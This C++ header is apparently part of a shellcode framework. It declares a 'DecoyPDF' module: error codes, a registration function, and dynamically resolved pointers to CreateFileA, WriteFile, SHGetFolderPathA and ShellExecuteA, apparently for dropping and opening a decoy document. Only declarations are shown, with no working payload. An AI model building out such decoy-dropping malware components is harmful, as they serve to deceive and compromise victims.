#include "shellcode.hpp"
#include <shellapi.h>
#include <ShlObj.h>

#define CUSTOM_MODULE_DECOYPDF_FAIL_MALLOC_STRUCT           0x1001
#define CUSTOM_MODULE_DECOYPDF_FAIL_GET_POINTERS            0x1002
#define CUSTOM_MODULE_DECOYPDF_FAIL_REGISTER_MODULE         0x1003
#define ERROR_GET_POINTER_CUSTOM_MODULE_CREATEFILEA         0x1004
#define ERROR_GET_POINTER_CUSTOM_MODULE_WRITEFILEA          0x1005
#define ERROR_GET_POINTER_CUSTOM_MODULE_CLOSEHANDLE         0x1006
#define ERROR_GET_POINTER_CUSTOM_MODULE_SHGETFOLDERPATHA    0x1007
#define ERROR_GET_POINTER_CUSTOM_MODULE_SHELLEXECUTEA       0x1008
#define FAIL_LOAD_LIBRARY_CUSTOM_MODULE_SHELL32             0x1009
#define ERROR_GET_POINTER_CUSTOM_MODULE_MALLOC              0x100A
#define ERROR_GET_POINTER_CUSTOM_MODULE_FREE                0x100B


DWORD RegisterModule_DecoyPDF(sh_context* ctx, uint32_t module_id);

using CreateFileA_t = decltype(&CreateFileA);
using WriteFile_t = decltype(&WriteFile);
using CloseHandle_t = decltype(&CloseHandle);
using SHGetFolderPathA_t = decltype(&SHGetFolderPathA);
using ShellExecuteA_t = decltype(&ShellExecuteA);
using malloc_t = decltype(&malloc);
using free_t = decltype(&free);

struct decoy_pdf_pointers {
    CreateFileA_t fp_CreateFileA;
    WriteFile_t fp_WriteFile;
    CloseHandle_t fp_CloseHandle;
    SHGetFolderPathA_t fp_SHGetFolderPathA;
    ShellExecuteA_t fp_ShellExecuteA;
    malloc_t fp_malloc;
    free_t fp_free;
};
